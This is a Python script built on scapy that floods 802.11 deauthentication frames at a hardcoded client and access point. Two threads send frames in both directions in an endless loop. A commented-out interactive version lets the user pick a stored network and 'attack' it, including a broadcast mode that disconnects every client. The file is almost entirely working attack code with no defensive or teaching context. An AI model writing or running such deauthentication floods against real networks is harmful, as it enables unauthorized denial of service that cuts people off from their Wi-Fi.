from scapy.all import *

target_mac = "0A:61:57:7D:FC:3F"
gateway_mac = "0C:B9:37:85:C5:1A"
# # 802.11 frame
# # addr1: destination MAC
# # addr2: source MAC
# # addr3: Access Point MAC
# dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# #dot11 = Dot11(type=8, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# # stack them up
# packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# # send the packet
# sendp(packet, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1)

##########################################################################################

from scapy.all import *
import shelve
import sys
import os
from threading import Thread
target_mac = "5a:2e:9c:60:ba:09"
gateway_mac = "00:16:78:11:b2:7a" # mama-ext
interface="wlan0mon"
def for_ap(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 100, inter = 0.1)
def for_client(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 100, inter = 0.1)
frame = RadioTap() / Dot11(addr1 = gateway_mac, addr2 = target_mac, addr3 = target_mac) / Dot11Deauth(reason=7)
frame1 = RadioTap() / Dot11(addr1 = target_mac, addr2 = gateway_mac, addr3 = gateway_mac) / Dot11Deauth(reason=7)
# t1 = Thread(target = for_ap, args = (frame, interface))
# t1.start()
# t2 = Thread(target = for_client, args = (frame1, interface))
# t2.start()

st = threading.Thread(target = for_ap, args = (frame, interface))
lt = threading.Thread(target = for_client, args = (frame1, interface))
st.start()
lt.start()
st.join()
lt.join()

# for i in range(10):
#     sendp(frame, iface = interface, count = 10, inter = 0.01)
#     sendp(frame1, iface = interface, count = 10, inter = 0.01)



##########################################################################################

# from scapy.all import *
# import shelve
# import sys
# import os
# from threading import Thread

# def main():
#         interface = "wlan0mon"
#         s = shelve.open("wireless_data.dat")
#         print("Seq", "\tBSSID\t\t", "\tChannel", "SSID")
#         keys = s.keys()
#         list1 = []
#         for each in keys:
#             list1.append(int(each))
#         list1.sort()
#         for key in list1:
#             key = str(key)
#             print(key, "\t", s[key][0], "\t", s[key][1], "\t", s[key][2])
#         s.close()

#         a = input("Enter the seq number of wifi ")
#         r = shelve.open("wireless_data.dat")
#         print("Are you Sure to attack on ", r[a][0], " ", r[a][2])
#         victim_mac = raw_input("Enter the victim MAC or for broadcast press 0\ t ")
#         if victim_mac == '0':
#             victim_mac = "FF:FF:FF:FF:FF:FF"

#         cmd1 = "iwconfig wlan1 channel " + str(r[a][1])
#         cmd2 = "iwconfig mon0 channel " + str(r[a][1])
#         os.system(cmd1)
#         os.system(cmd2)


#         BSSID = r[a][0]
#         frame = RadioTap() / Dot11(addr1 = BSSID, addr2 = victim_mac, addr3 = BSSID) / Dot11Deauth()
#         frame1 = RadioTap() / Dot11(addr1 = victim_mac, addr2 = BSSID, addr3 = BSSID) / Dot11Deauth()

#         if victim_mac != "FF:FF:FF:FF:FF:FF":
#             t1 = Thread(target = for_ap, args = (frame, interface))
#         t1.start()
#         t2 = Thread(target = for_client, args = (frame1, interface))
#         t2.start()

# def for_ap(frame, interface):
#     while True:
#         sendp(frame, iface = interface, count = 20, inter = .001)
# def for_client(frame, interface):
#     while True:
#         sendp(frame, iface = interface, count = 20, inter = .001)

# if __name__ == '__main__':
#   main()